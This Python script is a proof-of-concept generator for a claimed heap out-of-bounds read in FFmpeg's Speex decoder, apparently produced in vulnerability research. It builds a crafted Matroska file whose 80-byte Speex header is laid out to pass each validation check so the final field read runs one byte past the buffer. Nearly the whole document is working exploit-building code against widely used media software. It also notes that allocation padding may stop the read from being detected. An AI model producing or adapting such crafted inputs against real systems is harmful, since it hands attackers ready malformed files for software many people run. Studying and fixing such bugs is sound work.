"""
PoC generator for VULN 001: Heap OOB Read in parse_speex_extradata
(libavcodec/speexdec.c lines 1405-1438)

The vulnerability: parse_speex_extradata locates "Speex   " at offset P in the
extradata buffer. It then advances the pointer by 28 and performs 10 x LE32 reads
+ 1 x 4-byte skip, consuming bytes [P+28 .. P+71] (44 bytes). The only guard is
extradata_size >= 80. When P = 9, the last read (extra_headers) accesses bytes
[77..80], where index 80 is past the 80-byte logical buffer end.

Trigger approach: use a Matroska file with CodecID "A_MS/ACM" and a WAVEFORMATEX
header (18 bytes, wFormatTag=0xA109 = Speex) followed by our crafted 80-byte
Speex header. The matroska demuxer maps 0xA109 -> AV_CODEC_ID_SPEEX via
ff_get_wav_header(), then copies the remaining 80 bytes as extradata.
When speex_decode_init() is called, it invokes parse_speex_extradata() with
our crafted buffer.

Crafted 80-byte Speex header layout:
  [0-8]   : 0x00 * 9                (pre-magic padding; "Speex   " at P=9)
  [9-16]  : 'S','p','e','e','x',' ',' ',' '  (8-byte magic)
  [17-44] : 0x00 * 28               (skip area before version_id)
  [45-48] : 0x80,0x3E,0x00,0x00     (rate = 16000 LE32, passes rate > 0 check)
  [49-52] : 0x00,0x00,0x00,0x00     (mode = 0 = NB, valid 0-2)
  [53-56] : 0x04,0x00,0x00,0x00     (bitstream_version = 4, exact-match check)
  [57-60] : 0x01,0x00,0x00,0x00     (nb_channels = 1, valid 1-2)
  [61-64] : 0x00,0x00,0x00,0x00     (bitrate = 0, no check)
  [65-68] : 0xA0,0x00,0x00,0x00     (frame_size = 160 = NB_FRAME_SIZE, valid)
  [69-72] : 0x00,0x00,0x00,0x00     (vbr = 0, no check)
  [73-76] : 0x01,0x00,0x00,0x00     (frames_per_packet = 1, valid 1-64)
  [77-79] : 0x00,0x00,0x00          (first 3 bytes of extra_headers in-bounds)
  [80]    : <- OOB READ: 4th byte of extra_headers read by bytestream_get_le32
"""

import struct

# ──────────────────────────────────────────────
# EBML / Matroska helpers
# ──────────────────────────────────────────────

def encode_vint(val):
    """Encode EBML variable-length integer (VINT)."""
    if val < 0x7F:
        return bytes([val | 0x80])
    elif val < 0x3FFF:
        return struct.pack('>H', val | 0x4000)
    elif val < 0x1FFFFF:
        b = struct.pack('>I', val | 0x200000)
        return b[1:]
    elif val < 0x0FFFFFFF:
        return struct.pack('>I', val | 0x10000000)
    else:
        raise ValueError(f"Value too large for VINT: {val}")

def ebml_element(elem_id, data):
    """Return EBML element: ID bytes + VINT(size) + data bytes."""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return elem_id + encode_vint(len(data)) + data

def encode_uint(val, size):
    return val.to_bytes(size, 'big')

# ──────────────────────────────────────────────
# EBML element IDs
# ──────────────────────────────────────────────
EBML_ID             = b'\x1A\x45\xDF\xA3'
DOCTYPE_ID          = b'\x42\x82'
DOCTYPE_VER_ID      = b'\x42\x87'
DOCTYPE_READ_VER_ID = b'\x42\x85'
SEGMENT_ID          = b'\x18\x53\x80\x67'
SEGMENT_INFO_ID     = b'\x15\x49\xA9\x66'
TIMECODE_SCALE_ID   = b'\x2A\xD7\xB1'
MUXING_APP_ID       = b'\x4D\x80'
WRITING_APP_ID      = b'\x57\x41'
TRACKS_ID           = b'\x16\x54\xAE\x6B'
TRACK_ENTRY_ID      = b'\xAE'
TRACK_NUMBER_ID     = b'\xD7'
TRACK_UID_ID        = b'\x73\xC5'
TRACK_TYPE_ID       = b'\x83'
CODEC_ID_ID         = b'\x86'
CODEC_PRIVATE_ID    = b'\x63\xA2'
AUDIO_ID            = b'\xE1'
SAMPLE_RATE_ID      = b'\xB5'
CHANNELS_ID         = b'\x9F'
CLUSTER_ID          = b'\x1F\x43\xB6\x75'
TIMECODE_ID         = b'\xE7'
SIMPLE_BLOCK_ID     = b'\xA3'

# ──────────────────────────────────────────────
# Build WAVEFORMATEX header (18 bytes, little-endian)
# wFormatTag=0xA109 maps to AV_CODEC_ID_SPEEX via ff_codec_wav_tags in riff.c
# cbSize=0 so ff_get_wav_header won't allocate extradata itself;
# the matroska demuxer will then copy codec_priv[18..97] as extradata.
# ──────────────────────────────────────────────
wFormatTag      = 0xA109   # Speex RIFF tag
nChannels       = 1
nSamplesPerSec  = 16000
nAvgBytesPerSec = 8000
nBlockAlign     = 20
wBitsPerSample  = 16
cbSize          = 0        # must be 0 so no extradata is set inside ff_get_wav_header

waveformatex = struct.pack('<HHIIHHHH',
    wFormatTag,
    nChannels,
    nSamplesPerSec,
    nAvgBytesPerSec,
    nBlockAlign,
    wBitsPerSample,
    cbSize,
    0)  # pad to 18 bytes (struct gives us 16 bytes; add 2-byte dummy? No...)

# Let me be precise: WAVEFORMATEX = wFormatTag(2) + nChannels(2) + nSamplesPerSec(4)
# + nAvgBytesPerSec(4) + nBlockAlign(2) + wBitsPerSample(2) + cbSize(2) = 18 bytes total
waveformatex = struct.pack('<HHIIHHH',
    wFormatTag,        # 2 bytes
    nChannels,         # 2 bytes
    nSamplesPerSec,    # 4 bytes
    nAvgBytesPerSec,   # 4 bytes
    nBlockAlign,       # 2 bytes
    wBitsPerSample,    # 2 bytes
    cbSize)            # 2 bytes
assert len(waveformatex) == 18, f"Expected 18 bytes, got {len(waveformatex)}"

# ──────────────────────────────────────────────
# Build crafted 80-byte Speex header
# All validation checks in parse_speex_extradata must pass before reaching OOB.
# ──────────────────────────────────────────────
speex_header = bytearray(80)

# [9..16]: magic "Speex   " (offset P = 9)
MAGIC = b'Speex   '
speex_header[9:17] = MAGIC

# parse_speex_extradata: buf = extradata+9, then buf += 28 → extradata+37
# Reads (each bytestream_get_le32 advances buf by 4):
#   version_id        @ [37..40]  (no check; leave as 0)
#   buf += 4 skip     @ [41..44]
#   rate              @ [45..48]  must be > 0
#   mode              @ [49..52]  must be 0..2
#   bitstream_version @ [53..56]  must == 4
#   nb_channels       @ [57..60]  must be 1..2
#   bitrate           @ [61..64]  (no check)
#   frame_size        @ [65..68]  mode=0 → must be >= 160 and <= INT32_MAX
#   vbr               @ [69..72]  (no check)
#   frames_per_packet @ [73..76]  must be 1..64 and < INT32_MAX/nb_channels/frame_size
#   extra_headers     @ [77..80]  ← OOB READ (byte 80 is past the 80-byte buffer!)

# [45..48] rate = 16000 LE32
struct.pack_into('<I', speex_header, 45, 16000)

# [49..52] mode = 0 (NB, valid 0..2)
struct.pack_into('<I', speex_header, 49, 0)

# [53..56] bitstream_version = 4 (exact check)
struct.pack_into('<I', speex_header, 53, 4)

# [57..60] nb_channels = 1
struct.pack_into('<I', speex_header, 57, 1)

# [61..64] bitrate = 0 (no check)
struct.pack_into('<I', speex_header, 61, 0)

# [65..68] frame_size = 160 (NB_FRAME_SIZE; mode=0 → must be >= 160)
# After FFMIN: s->frame_size = FFMIN(160 << 0, NB_FRAME_SIZE << 0) = 160
struct.pack_into('<I', speex_header, 65, 160)

# [69..72] vbr = 0
struct.pack_into('<I', speex_header, 69, 0)

# [73..76] frames_per_packet = 1 (valid: > 0, <= 64, < INT32_MAX/1/160)
struct.pack_into('<I', speex_header, 73, 1)

# [77..79] first 3 bytes of extra_headers (within bounds, zeroed)
# byte[80] is the 4th byte → OOB

speex_header = bytes(speex_header)
assert len(speex_header) == 80
assert speex_header[9:17] == MAGIC
print(f"'Speex   ' at offset: {speex_header.index(MAGIC)}")

# ──────────────────────────────────────────────
# CodecPrivate = WAVEFORMATEX (18) + crafted Speex header (80) = 98 bytes
# ──────────────────────────────────────────────
codec_private = waveformatex + speex_header
assert len(codec_private) == 98

# ──────────────────────────────────────────────
# Build Matroska / EBML structure
# ──────────────────────────────────────────────

# EBML header
ebml_header_body = (
    ebml_element(DOCTYPE_ID,          'matroska') +
    ebml_element(DOCTYPE_VER_ID,      encode_uint(4, 1)) +
    ebml_element(DOCTYPE_READ_VER_ID, encode_uint(2, 1))
)
ebml_header = ebml_element(EBML_ID, ebml_header_body)

# Audio sub-element
audio_settings = (
    ebml_element(SAMPLE_RATE_ID, struct.pack('>f', 16000.0)) +
    ebml_element(CHANNELS_ID,    encode_uint(1, 1))
)
audio_element = ebml_element(AUDIO_ID, audio_settings)

# Track entry  (type 2 = audio)
track_entry_body = (
    ebml_element(TRACK_NUMBER_ID,  encode_uint(1, 1)) +
    ebml_element(TRACK_UID_ID,     encode_uint(1, 8)) +
    ebml_element(TRACK_TYPE_ID,    encode_uint(2, 1)) +
    ebml_element(CODEC_ID_ID,      'A_MS/ACM') +
    ebml_element(CODEC_PRIVATE_ID, codec_private) +
    audio_element
)
track_entry = ebml_element(TRACK_ENTRY_ID, track_entry_body)
tracks = ebml_element(TRACKS_ID, track_entry)

# Segment info
seg_info_body = (
    ebml_element(TIMECODE_SCALE_ID, encode_uint(1000000, 4)) +
    ebml_element(MUXING_APP_ID,     'poc') +
    ebml_element(WRITING_APP_ID,    'poc')
)
seg_info = ebml_element(SEGMENT_INFO_ID, seg_info_body)

# Minimal cluster with one SimpleBlock
# SimpleBlock = VINT(tracknum=1) + timecode(2 bytes BE) + flags(1) + payload
fake_block = b'\x81' + b'\x00\x00' + b'\x00' + b'\x00' * 10
simple_block = ebml_element(SIMPLE_BLOCK_ID, fake_block)
cluster = ebml_element(
    CLUSTER_ID,
    ebml_element(TIMECODE_ID, encode_uint(0, 2)) + simple_block
)

# Assemble segment
segment_content = seg_info + tracks + cluster
segment = SEGMENT_ID + encode_vint(len(segment_content)) + segment_content

output = ebml_header + segment

outfile = 'vuln_001_input.mkv'
with open(outfile, 'wb') as f:
    f.write(output)

print(f"Written {len(output)} bytes to {outfile}")
print(f"CodecPrivate size : {len(codec_private)} bytes "
      f"(18 WAVEFORMATEX + 80 Speex header)")
print(f"Extradata size    : {len(speex_header)} bytes")
print(f"OOB read target   : byte index 80 of extradata "
      f"(4th byte of extra_headers LE32 at buf[77..80])")
print(f"Note: with AV_INPUT_BUFFER_PADDING_SIZE=64, actual allocation is "
      f"{len(speex_header)+64} bytes; ASAN may not fire due to padding.")
